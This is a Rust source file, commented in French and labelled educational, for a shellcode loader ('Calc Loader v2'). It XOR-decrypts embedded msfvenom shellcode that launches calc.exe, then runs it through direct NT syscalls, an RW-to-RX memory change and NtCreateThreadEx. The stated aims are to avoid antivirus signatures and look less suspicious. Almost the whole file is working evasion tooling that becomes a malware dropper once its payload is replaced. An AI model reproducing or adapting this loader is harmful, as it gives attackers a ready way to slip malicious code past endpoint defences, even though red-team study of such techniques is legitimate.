/*
    ============================================================
    🦀 CALC LOADER v2 - Direct Syscalls + XOR + RW→RX
    ============================================================
    
    Ce loader démontre les concepts suivants:
    1. Direct Syscalls via la librairie rust_syscalls
    2. XOR encryption du shellcode (anti-signature)
    3. Allocation mémoire RW puis transition vers RX (pas de RWX!)
    4. Création de thread avec NtCreateThreadEx
    5. Exécution de shellcode (calc.exe)
    
    Améliorations v2:
    - Shellcode chiffré XOR (pas de signature statique)
    - Protection mémoire RW→RX (moins suspect que RWX)
    
    ⚠️  USAGE ÉDUCATIF UNIQUEMENT
    
    Auteur: Educational Purpose
*/

use std::ptr::null_mut;
use rust_syscalls::syscall;
use winapi::ctypes::c_void;
use winapi::shared::ntdef::{NTSTATUS, NULL};
use winapi::shared::ntstatus::STATUS_SUCCESS;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winbase::INFINITE;
use winapi::um::handleapi::CloseHandle;

// ============================================================
// CONSTANTES MÉMOIRE (de winnt.h - ne changent JAMAIS)
// ============================================================
const PAGE_READWRITE: u32 = 0x04;      // RW - pour écrire
const PAGE_EXECUTE_READ: u32 = 0x20;   // RX - pour exécuter
const MEM_COMMIT_RESERVE: u32 = 0x3000; // MEM_COMMIT | MEM_RESERVE

// ============================================================
// CONFIGURATION XOR
// ============================================================
const XOR_KEY: [u8; 4] = [0xDE, 0xAD, 0xBE, 0xEF];

/// Shellcode CHIFFRÉ pour lancer calc.exe (Windows x64)
/// Original: msfvenom -p windows/x64/exec CMD=calc.exe -f rust
/// Puis XORé avec la clé [0xDE, 0xAD, 0xBE, 0xEF]
const ENCRYPTED_SHELLCODE: [u8; 276] = [
    0x22, 0xe5, 0x3d, 0x0b, 0x2e, 0x45, 0x7e, 0xef, 0xde, 0xad, 0xff, 0xbe,
    0x9f, 0xfd, 0xec, 0xbe, 0x88, 0xe5, 0x8f, 0x3d, 0xbb, 0xe5, 0x35, 0xbd,
    0xbe, 0xe5, 0x35, 0xbd, 0xc6, 0xe5, 0x35, 0xbd, 0xfe, 0xe5, 0x35, 0x9d,
    0x8e, 0xe5, 0xb1, 0x58, 0x94, 0xe7, 0xf3, 0xde, 0x17, 0xe5, 0x8f, 0x2f,
    0x72, 0x91, 0xdf, 0x93, 0xdc, 0x81, 0x9e, 0xae, 0x1f, 0x64, 0xb3, 0xae,
    0xdf, 0x6c, 0x5c, 0x02, 0x8c, 0xec, 0xef, 0xa7, 0x55, 0xff, 0x9e, 0x64,
    0x9c, 0x91, 0xf6, 0xee, 0x0e, 0x26, 0x3e, 0x67, 0xde, 0xad, 0xbe, 0xa7,
    0x5b, 0x6d, 0xca, 0x88, 0x96, 0xac, 0x6e, 0xbf, 0x55, 0xe5, 0xa6, 0xab,
    0x55, 0xed, 0x9e, 0xa6, 0xdf, 0x7d, 0x5d, 0xb9, 0x96, 0x52, 0x77, 0xae,
    0x55, 0x99, 0x36, 0xa7, 0xdf, 0x7b, 0xf3, 0xde, 0x17, 0xe5, 0x8f, 0x2f,
    0x72, 0xec, 0x7f, 0x26, 0xd3, 0xec, 0xbf, 0x2e, 0xe6, 0x4d, 0xcb, 0x1e,
    0x92, 0xae, 0xf2, 0xcb, 0xd6, 0xe8, 0x87, 0x3e, 0xab, 0x75, 0xe6, 0xab,
    0x55, 0xed, 0x9a, 0xa6, 0xdf, 0x7d, 0xd8, 0xae, 0x55, 0xa1, 0xf6, 0xab,
    0x55, 0xed, 0xa2, 0xa6, 0xdf, 0x7d, 0xff, 0x64, 0xda, 0x25, 0xf6, 0xee,
    0x0e, 0xec, 0xe6, 0xae, 0x86, 0xf3, 0xe7, 0xb5, 0x9f, 0xf5, 0xff, 0xb6,
    0x9f, 0xf7, 0xf6, 0x6c, 0x32, 0x8d, 0xff, 0xbd, 0x21, 0x4d, 0xe6, 0xae,
    0x87, 0xf7, 0xf6, 0x64, 0xcc, 0x44, 0xe9, 0x10, 0x21, 0x52, 0xe3, 0xa7,
    0x64, 0xac, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef, 0xde, 0xe5, 0x33, 0x62,
    0xdf, 0xac, 0xbe, 0xef, 0x9f, 0x17, 0x8f, 0x64, 0xb1, 0x2a, 0x41, 0x3a,
    0x65, 0x5d, 0x0b, 0x4d, 0x88, 0xec, 0x04, 0x49, 0x4b, 0x10, 0x23, 0x10,
    0x0b, 0xe5, 0x3d, 0x2b, 0xf6, 0x91, 0xb8, 0x93, 0xd4, 0x2d, 0x45, 0x0f,
    0xab, 0xa8, 0x05, 0xa8, 0xcd, 0xdf, 0xd1, 0x85, 0xde, 0xf4, 0xff, 0x66,
    0x04, 0x52, 0x6b, 0x8c, 0xbf, 0xc1, 0xdd, 0xc1, 0xbb, 0xd5, 0xdb, 0xef,
];

// ============================================================
// FONCTION XOR
// ============================================================
fn xor_decrypt(encrypted: &[u8], key: &[u8]) -> Vec<u8> {
    encrypted.iter().enumerate()
        .map(|(i, byte)| byte ^ key[i % key.len()])
        .collect()
}

/// Exécute le shellcode en utilisant des syscalls directs.
/// 
/// Flow v2: XOR decrypt → Alloc RW → Copy → Protect RX → Execute
fn execute_shellcode(encrypted_shellcode: &[u8]) -> Result<(), String> {
    println!("[*] Calc Loader v2 - Direct Syscalls + XOR + RW→RX");
    println!("[*] Encrypted shellcode size: {} bytes", encrypted_shellcode.len());
    
    // =====================================================
    // ÉTAPE 1: Déchiffrer le shellcode
    // =====================================================
    println!("\n[STEP 1] XOR Decryption");
    println!("────────────────────────────────────────────");
    
    let shellcode = xor_decrypt(encrypted_shellcode, &XOR_KEY);
    
    println!("[+] Decrypted! First 4 bytes: {:02X} {:02X} {:02X} {:02X}",
             shellcode[0], shellcode[1], shellcode[2], shellcode[3]);
    println!("[+] Expected (msfvenom):      FC 48 83 E4");
    
    unsafe {
        let h_process: *mut c_void = -1isize as *mut c_void;
        
        // =====================================================
        // ÉTAPE 2: Allouer mémoire RW (pas RWX!)
        // =====================================================
        println!("\n[STEP 2] NtAllocateVirtualMemory (RW)");
        println!("────────────────────────────────────────────");
        
        let mut base_address: *mut c_void = null_mut();
        let mut region_size: usize = shellcode.len();
        
        let status: NTSTATUS = syscall!(
            "NtAllocateVirtualMemory",
            h_process,
            &mut base_address as *mut _ as *mut _,
            0usize,
            &mut region_size as *mut usize,
            MEM_COMMIT_RESERVE,
            PAGE_READWRITE  // RW seulement !
        );
        
        if status != STATUS_SUCCESS {
            return Err(format!("NtAllocateVirtualMemory failed: {:#X}", status));
        }
        
        println!("[+] Allocated at: {:p} (PAGE_READWRITE)", base_address);
        
        // =====================================================
        // ÉTAPE 3: Copier le shellcode (pas besoin de syscall)
        // =====================================================
        println!("\n[STEP 3] Copy shellcode to memory");
        println!("────────────────────────────────────────────");
        
        std::ptr::copy_nonoverlapping(
            shellcode.as_ptr(),
            base_address as *mut u8,
            shellcode.len()
        );
        
        println!("[+] Written {} bytes", shellcode.len());
        
        // =====================================================
        // ÉTAPE 4: Changer protection RW → RX
        // =====================================================
        println!("\n[STEP 4] NtProtectVirtualMemory (RW → RX)");
        println!("────────────────────────────────────────────");
        
        let mut old_protect: u32 = 0;
        let mut protect_addr = base_address;
        let mut protect_size = shellcode.len();
        
        let status: NTSTATUS = syscall!(
            "NtProtectVirtualMemory",
            h_process,
            &mut protect_addr as *mut _ as *mut _,
            &mut protect_size as *mut usize,
            PAGE_EXECUTE_READ,
            &mut old_protect as *mut u32
        );
        
        if status != STATUS_SUCCESS {
            return Err(format!("NtProtectVirtualMemory failed: {:#X}", status));
        }
        
        println!("[+] Protection changed: 0x{:02X} → 0x{:02X}", old_protect, PAGE_EXECUTE_READ);
        
        // =====================================================
        // ÉTAPE 5: Créer thread pour exécuter
        // =====================================================
        println!("\n[STEP 5] NtCreateThreadEx");
        println!("────────────────────────────────────────────");
        
        let mut thread_handle: *mut c_void = null_mut();
        
        let status: NTSTATUS = syscall!(
            "NtCreateThreadEx",
            &mut thread_handle as *mut _ as *mut _,
            0x1FFFFFu32,
            NULL,
            h_process,
            base_address,
            NULL,
            0u32,
            0usize,
            0usize,
            0usize,
            NULL
        );
        
        if status != STATUS_SUCCESS {
            return Err(format!("NtCreateThreadEx failed: {:#X}", status));
        }
        
        println!("[+] Thread created: {:p}", thread_handle);
        
        // =====================================================
        // ÉTAPE 6: Attendre
        // =====================================================
        println!("\n[STEP 6] Executing...");
        println!("────────────────────────────────────────────");
        
        WaitForSingleObject(thread_handle, INFINITE);
        CloseHandle(thread_handle);
        
        println!("[+] Done!");
        
        Ok(())
    }
}

fn main() {
    println!(r#"
    ╔═══════════════════════════════════════════════════════════╗
    ║  🦀 CALC LOADER v2 - Direct Syscalls + XOR + RW→RX 🦀    ║
    ║                                                           ║
    ║  Improvements:                                            ║
    ║  ✓ XOR encrypted shellcode (anti-signature)               ║
    ║  ✓ RW → RX memory (not RWX!)                              ║
    ║  ✓ Direct syscalls                                        ║
    ║                                                           ║
    ║  ⚠️  FOR EDUCATIONAL PURPOSES ONLY                        ║
    ╚═══════════════════════════════════════════════════════════╝
    "#);
    
    match execute_shellcode(&ENCRYPTED_SHELLCODE) {
        Ok(_) => {
            println!("\n════════════════════════════════════════════");
            println!("[✓] SUCCESS: Calculator should have appeared!");
            println!("════════════════════════════════════════════");
        }
        Err(e) => {
            eprintln!("\n[✗] ERROR: {}", e);
            std::process::exit(1);
        }
    }
}
